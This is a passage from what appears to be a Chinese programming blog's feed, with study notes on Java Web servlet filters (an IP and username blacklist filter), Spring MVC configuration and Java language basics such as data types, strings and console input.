class="keyword">this</span>.config = config;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取拒绝IP地址</span></span><br><span class="line">    ipblock=config.getInitParameter(<span class="string">"ipblock"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取blacklist初始化参数</span></span><br><span class="line">    blackList=config.getInitParameter(<span class="string">"blacklist"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">                     FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">"NoteFilter: doFilter()"</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!checkRemoteIP(request,response))<span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!checkUsername(request,response))<span class="keyword">return</span>;</span><br><span class="line">       </span><br><span class="line">    <span class="comment">//记录响应客户请求前的时间</span></span><br><span class="line">    <span class="keyword">long</span> before = System.currentTimeMillis();</span><br><span class="line">    config.getServletContext().log(<span class="string">"NoteFilter:before call chain.doFilter()"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//把请求转发给后续的过滤器或者Web组件</span></span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//记录响应客户请求后的时间</span></span><br><span class="line">    config.getServletContext().log(<span class="string">"NoteFilter:after call chain.doFilter()"</span>);</span><br><span class="line">    <span class="keyword">long</span> after = System.currentTimeMillis();</span><br><span class="line">    </span><br><span class="line">    String name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (request <span class="keyword">instanceof</span> HttpServletRequest) &#123;</span><br><span class="line">        name = ((HttpServletRequest)request).getRequestURI();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//记录响应客户请求所花的时间</span></span><br><span class="line">    config.getServletContext().log(<span class="string">"NoteFilter:"</span>+name + <span class="string">": "</span> + (after - before) + <span class="string">"ms"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">checkRemoteIP</span><span class="params">(ServletRequest request, ServletResponse response)</span> </span></span><br><span class="line"><span class="function">                        <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    <span class="comment">//读取客户的IP地址</span></span><br><span class="line">    String addr=request.getRemoteAddr();</span><br><span class="line">    <span class="keyword">if</span>(addr.indexOf(ipblock)==<span class="number">0</span>)&#123;</span><br><span class="line">      response.setContentType(<span class="string">"text/html;charset=GB2312"</span>);</span><br><span class="line">      PrintWriter out = response.getWriter();</span><br><span class="line">      out.println(<span class="string">"&lt;h1&gt;对不起,服务器无法为你提供服务。&lt;/h1&gt;"</span>);</span><br><span class="line">      out.flush();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">checkUsername</span><span class="params">(ServletRequest request, ServletResponse response)</span></span></span><br><span class="line"><span class="function">                      <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    String username =((HttpServletRequest) request).getParameter(<span class="string">"username"</span>);</span><br><span class="line">    <span class="keyword">if</span>(username!=<span class="keyword">null</span>)</span><br><span class="line">      username=<span class="keyword">new</span> String(username.getBytes(<span class="string">"ISO-8859-1"</span>),<span class="string">"GB2312"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (username!=<span class="keyword">null</span> &amp;&amp; username.indexOf(blackList) != -<span class="number">1</span>  )  &#123;</span><br><span class="line">      <span class="comment">//生成拒绝用户留言的网页</span></span><br><span class="line">      response.setContentType(<span class="string">"text/html;charset=GB2312"</span>);</span><br><span class="line">      PrintWriter out = response.getWriter();</span><br><span class="line">      out.println(<span class="string">"&lt;h1&gt;对不起,"</span>+username + <span class="string">",你没有权限留言 &lt;/h1&gt;"</span>);</span><br><span class="line">      out.flush();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"NoteFilter: destroy()"</span>); </span><br><span class="line">    config = <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Filter</code>的配置类似于<code>Servlet</code>，由<code>&lt;filter&gt;</code>和<code>&lt;filter-mapping&gt;</code>两组标签组成，如果Servlet版本大于3.0同样可以使用注解的方式配置Filter</p><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>NoteFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>mypack.NoteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>ipblock<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>221.45<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>blacklist<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>捣蛋鬼<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用 <code>@WebFilter</code> 标注</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebFilter</span>( <span class="comment">//用@WebFilter标注配置NoteFilter</span></span><br><span class="line">filterName = <span class="string">"NoteFilter"</span>, </span><br><span class="line">urlPatterns = <span class="string">"/note"</span>, </span><br><span class="line">initParams = &#123;</span><br><span class="line"><span class="meta">@WebInitParam</span>(name = <span class="string">"ipblock"</span>, value = <span class="string">"221.45"</span>),</span><br><span class="line"><span class="meta">@WebInitParam</span>(name = <span class="string">"blacklist"</span>, value = <span class="string">"捣蛋鬼"</span>)&#125;</span><br><span class="line">)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoteFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>Filter和Servlet的总结：<a href="https://javasec.org/javaweb/Filter&amp;Servlet/" target="_blank" rel="noopener">https://javasec.org/javaweb/Filter&amp;Servlet/</a></p><h2 id="7-序列化"><a href="#7-序列化" class="headerlink" title="7 序列化"></a>7 序列化</h2><h2 id="8-XML"><a href="#8-XML" class="headerlink" title="8 XML"></a>8 XML</h2><h2 id="9-MVC-设计模式"><a href="#9-MVC-设计模式" class="headerlink" title="9 MVC 设计模式"></a>9 MVC 设计模式</h2><p>spring MVC 工作流程</p><ol><li>用户向服务端发送一次请求，这个请求会先到前端控制器DispatcherServlet(也叫中央控制器)。</li><li>DispatcherServlet接收到请求后会调用HandlerMapping处理器映射器。由此得知，该请求该由哪个Controller来处理（并未调用Controller，只是得知）</li><li>DispatcherServlet调用HandlerAdapter处理器适配器，告诉处理器适配器应该要去执行哪个Controller</li><li>HandlerAdapter处理器适配器去执行Controller并得到ModelAndView(数据和视图)，并层层返回给DispatcherServlet</li><li>DispatcherServlet将ModelAndView交给ViewReslover视图解析器解析，然后返回真正的视图。</li><li>DispatcherServlet将模型数据填充到视图中</li><li>DispatcherServlet将结果响应给用户</li></ol><p>lib 文件夹中必须包含 Spring 软件包的依赖</p><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee</span></span></span><br><span class="line"><span class="tag"><span class="string">                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">version</span>=<span class="string">"4.0"</span> &gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Spring MVC Sample<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloWeb<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">      org.springframework.web.servlet.DispatcherServlet</span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloWeb<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>为 DispatcherServlet 映射的URL为”/“，所有访问应用的用户都会由 DispatcherServlet 来预处理，然后再由它转发给后续组件。为 DispatcherServlet 设置的 Servlet 名字为 “HelloWeb”，即必须为 Spring MVC 提供一个名为 HelloWeb-servlet.xml 的配置文件。</p><p>HelloWeb-servlet.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span> = <span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:context</span> = <span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span> = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span> = <span class="string">"http://www.springframework.org/schema/beans     </span></span></span><br><span class="line"><span class="tag"><span class="string">  http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">  http://www.springframework.org/schema/context </span></span></span><br><span class="line"><span class="tag"><span class="string">  http://www.springframework.org/schema/context/spring-context-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span> = <span class="string">"mypack"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span> = <span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"prefix"</span> <span class="attr">value</span> = <span class="string">"/WEB-INF/jsp/"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"suffix"</span> <span class="attr">value</span> = <span class="string">".jsp"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>指定解析视图组件的为 InternalResourceViewResolver ，prefix 和 suffix 属性分别设定了视图文件的前缀和后缀。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>《Tomcat 与 Java Web 开发技术详解》—— 孙卫琴</li><li><a href="https://javasec.org/javaweb/" target="_blank" rel="noopener">https://javasec.org/javaweb/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-Java-Web-目录结构&quot;&gt;&lt;a href=&quot;#1-Java-Web-目录结构&quot; class=&quot;headerlink&quot; title=&quot;1 Java Web 目录结构&quot;&gt;&lt;/a&gt;1 Java Web 目录结构&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2020/08/23/Java_02/20200816173242.png&quot; alt=&quot;image-20200816173234356&quot;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;目录&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;/test1_war_exploded&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Web应用根目录，存储 jsp 或 html 文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;/test1_war_exploded/WEB-INF&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;存放配置文件，不能直接访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;/test1_war_exploded/WEB-INF/classes&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;存放编译后的 class 文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;/test1_war_exploded/WEB-INF/lib&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;存放所需 jar 文件，如 JDBC 驱动的 jar 文件&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;web.xml：servlet 、servlet mapping 以及其他配置&lt;/p&gt;
&lt;p&gt;编译 servlet 命令：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;javac  -sourcepath src -classpath D:\soft\server\apache-tomcat-9.0.37\lib\servlet-api.jar -d WEB-INF\classes src\mypack\DispatcherServlet.java&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="Java" scheme="https://jlkl.github.io/tags/Java/"/>
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Java 基础</title>
    <link href="https://jlkl.github.io/2020/08/23/Java_01/"/>
    <id>https://jlkl.github.io/2020/08/23/Java_01/</id>
    <published>2020-08-23T07:16:59.000Z</published>
    <updated>2020-08-23T07:32:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Java-概述"><a href="#1-Java-概述" class="headerlink" title="1 Java 概述"></a>1 Java 概述</h2><p>2014 Java8</p><p>2017 Java9</p><p>Java11 LTS版</p><h2 id="2-Java-程序设计环境"><a href="#2-Java-程序设计环境" class="headerlink" title="2 Java 程序设计环境"></a>2 Java 程序设计环境</h2><h3 id="2-1-Java-术语"><a href="#2-1-Java-术语" class="headerlink" title="2.1 Java 术语"></a>2.1 Java 术语</h3><ul><li><p>JDK: Java开发工具(包含JRE)</p></li><li><p>JRE: Java运行环境</p></li><li><p>Java SE (Standard Edition) 标准版本：用于桌面或者简单服务器应用的Java平台</p></li><li><p>Java EE (Enterprise Edition) 企业版本：用于复杂服务器应用的Java平台</p></li><li><p>Java ME (Micro Edition) 微型版本：用于小型设备的Java平台</p></li><li><p>NetBeans：Oracle公司的集成开发环境</p></li></ul><a id="more"></a><h3 id="2-2-命令行工具编译运行"><a href="#2-2-命令行工具编译运行" class="headerlink" title="2.2 命令行工具编译运行"></a>2.2 命令行工具编译运行</h3><p>javac 是一个 Java 编译器，将文件 Welcome.java 编译成 Welcome.class，java 程序启动 Java 虚拟机，虚拟机执行类文件中的字节码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac Welcome.java</span><br><span class="line">java Welcome</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><code>java Welcome</code>，java 区分大小写</li><li>javac 需要文件名（Welcome.java），而运行程序时，只需指定类名，不需要带扩展名 <code>.java</code> 或 <code>.class</code></li></ul><p>常见错误及解决方法：</p><p><a href="https://docs.oracle.com/javase/tutorial/getStarted/problems/index.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/tutorial/getStarted/problems/index.html</a></p><h3 id="2-3-JShell"><a href="#2-3-JShell" class="headerlink" title="2.3 JShell"></a>2.3 JShell</h3><p>Java 9 以上，交互式窗口</p><blockquote><p>那么何时开始使用IDE工具呢？标准是：如果你还离不开这个IDE工具，那么你就不能使用这个IDE工具；只有当你十分清楚在IDE工具里单击每一个菜单，单击每一个按钮……IDE工具在底层为你做的每个细节时，才可以使用IDE工具！</p></blockquote><h2 id="3-Java-基本程序设计"><a href="#3-Java-基本程序设计" class="headerlink" title="3 Java 基本程序设计"></a>3 Java 基本程序设计</h2><h3 id="3-1-简单结构"><a href="#3-1-简单结构" class="headerlink" title="3.1 简单结构"></a>3.1 简单结构</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstSample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello World!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>Java 区分大小写</li><li>Java 类名必须以字母开头，后面跟字母和数字的组合，长度基本没有限制，但不能用 Java 保留字。采用驼峰命名法（camel case），CamelCase</li><li>源代码文件名必须与公共类名字相同，并用 <code>.java</code> 为拓展名</li><li>main 方法必须声明为 public</li></ul><h3 id="3-2-注释"><a href="#3-2-注释" class="headerlink" title="3.2 注释"></a>3.2 注释</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line">以<span class="comment">/**开头,*/</span>结束，多用于类的注释</span><br></pre></td></tr></table></figure><h3 id="3-3-数据类型"><a href="#3-3-数据类型" class="headerlink" title="3.3 数据类型"></a>3.3 数据类型</h3><p>强类型语言，8中基本类型</p><h4 id="3-3-1-整型"><a href="#3-3-1-整型" class="headerlink" title="3.3.1 整型"></a>3.3.1 整型</h4><table><thead><tr><th align="center">类型</th><th align="center">字节数</th><th align="center">取值范围</th></tr></thead><tbody><tr><td align="center">int</td><td align="center">4</td><td align="center">-2147483648~2147483647(刚超过20亿)</td></tr><tr><td align="center">short</td><td align="center">2</td><td align="center">-32 768~32 767</td></tr><tr><td align="center">long</td><td align="center">8</td><td align="center">-9223372036854775808~9223372036854775807</td></tr><tr><td align="center">byte</td><td align="center">1</td><td align="center">-128~127</td></tr></tbody></table><ul><li>long 类型后面有一个后缀 L 或 l (40000000L)。十六进制 0x 或 0X。八进制前缀 0</li><li>Java 7 开始加上前缀 0b 或 0B 可以写二进制数。另外还可以为数字变量加上下划线，如 1_000_000 表示 100 万</li></ul><h4 id="3-3-2-浮点类型"><a href="#3-3-2-浮点类型" class="headerlink" title="3.3.2 浮点类型"></a>3.3.2 浮点类型</h4><table><thead><tr><th align="center">类型</th><th align="center">字节数</th><th align="center">有效位数</th></tr></thead><tbody><tr><td align="center">float</td><td align="center">4</td><td align="center">6~7位</td></tr><tr><td align="center">double</td><td align="center">8</td><td align="center">15位</td></tr></tbody></table><ul><li><p>float 类型后有一个后缀 F 或 f ，没有后缀的浮点数值默认为 double 类型</p></li><li><p>三个特殊的浮点数值：<br>正无穷大、负无穷大、NaN（不是一个数字）<br>Double.POSITIVE_INFINITY、Double.NEGATIVE_INFINITY、Double.NaN分别表示这三个特殊值<br>==注意判断时不能直接 == ，使用 <code>Double.isNaN</code> 方法判断==</p></li><li><p>==浮点值不适用于无法接受舍入误差的金融计算==<br>如，<code>System.out.println(2.0-1.1)</code>将打印出 0.8999999999999999 而不是 0.9，这是因为浮点数值采用二进制系统表示，在其中无法精确地表示分数 1/10，对于这种情况换用 <code>BigDecimal</code> 类</p></li></ul><h4 id="3-3-3-char-类型"><a href="#3-3-3-char-类型" class="headerlink" title="3.3.3 char 类型"></a>3.3.3 char 类型</h4><p>最好不要使用这种类型</p><blockquote><p>1个java的char字符并不完全等于一个unicode的字符。char采用的UCS-2编码，是一种淘汰的UTF-16编码，编码方式最多有65536种，远远少于当今Unicode拥有11万字符的需求。java只好对后来新增的Unicode字符用2个char拼出1个Unicode字符。导致String中char的数量不等于unicode字符的数量。 </p></blockquote><h4 id="3-3-4-boolean-类型"><a href="#3-3-4-boolean-类型" class="headerlink" title="3.3.4 boolean 类型"></a>3.3.4 boolean 类型</h4><p>boolean 只有两个值 true 和 false</p><ul><li>java中 true != 1,false != 0</li></ul><h3 id="3-4-变量与常量"><a href="#3-4-变量与常量" class="headerlink" title="3.4 变量与常量"></a>3.4 变量与常量</h3><p>Java 10 开始，可以使用 var 关键字而无需指定类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">12</span>;</span><br><span class="line"><span class="keyword">var</span> c = <span class="string">"hello"</span>;</span><br></pre></td></tr></table></figure><h4 id="3-4-1-常量"><a href="#3-4-1-常量" class="headerlink" title="3.4.1 常量"></a>3.4.1 常量</h4><p>用 <code>final</code> 指示常量，表示这个常量只能被赋值一次。习惯上，常量名使用全大写。</p><h4 id="3-4-2-枚举类型"><a href="#3-4-2-枚举类型" class="headerlink" title="3.4.2 枚举类型"></a>3.4.2 枚举类型</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">enum</span> <span class="title">Size</span> &#123;<span class="title">SMALL</span>, <span class="title">MEDIUM</span>, <span class="title">LARGE</span>&#125;</span></span><br></pre></td></tr></table></figure><h3 id="3-5-运算符"><a href="#3-5-运算符" class="headerlink" title="3.5 运算符"></a>3.5 运算符</h3><p><img src="/2020/08/23/Java_01/20200807171300.png" alt="image-20200807171257887"></p><h3 id="3-6-字符串"><a href="#3-6-字符串" class="headerlink" title="3.6 字符串"></a>3.6 字符串</h3><p>字符串用双引号括起来</p><ol><li><p>子串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String greeting = <span class="string">"Hello"</span>;</span><br><span class="line">String s = greeting.substring(<span class="number">0</span>, <span class="number">3</span>);<span class="comment">//左闭右开思想</span></span><br></pre></td></tr></table></figure></li><li><p>拼接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String message = <span class="string">"Hello"</span> + <span class="string">"World"</span>;</span><br></pre></td></tr></table></figure><p>连在一起，用界定符分隔，用 <code>join</code> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String all = String.join(<span class="string">"/"</span>, <span class="string">"S"</span>, <span class="string">"M"</span>, <span class="string">"L"</span>, <span class="string">"XL"</span>);</span><br><span class="line"><span class="comment">// all is string "S/M/L/XL"</span></span><br></pre></td></tr></table></figure><p>Java 11 还提供了一个 repeat 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String repeated = <span class="string">"Java"</span>.repeat(<span class="number">3</span>);</span><br><span class="line"><span class="comment">// "JavaJavaJava"比较字符串是否相等</span></span><br></pre></td></tr></table></figure></li><li><p>判断字符串相等</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Hello"</span>.equals(greeting);</span><br></pre></td></tr></table></figure></li><li><p>构建字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder builder = <span class="keyword">new</span> StringBuilder();<span class="comment">//Java5+</span></span><br><span class="line">builder.append(ch);</span><br><span class="line">builder.append(str);</span><br><span class="line">String myString = builder.toString();</span><br></pre></td></tr></table></figure></li></ol><h3 id="3-7-输入与输出"><a href="#3-7-输入与输出" class="headerlink" title="3.7 输入与输出"></a>3.7 输入与输出</h3><h4 id="3-7-1-读取输入"><a href="#3-7-1-读取输入" class="headerlink" title="3.7.1 读取输入"></a>3.7.1 读取输入</h4><p>首先构造一个与 System.in 相关联的 Scanner 对象，然后使用 Scanner 对象的方法进行读取</p><p>Scanner 对象属于 java.util 包，==不属于 java.lang 包的，都需要 import==</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This program demonstrates console input.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.10 2004-02-10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Cay 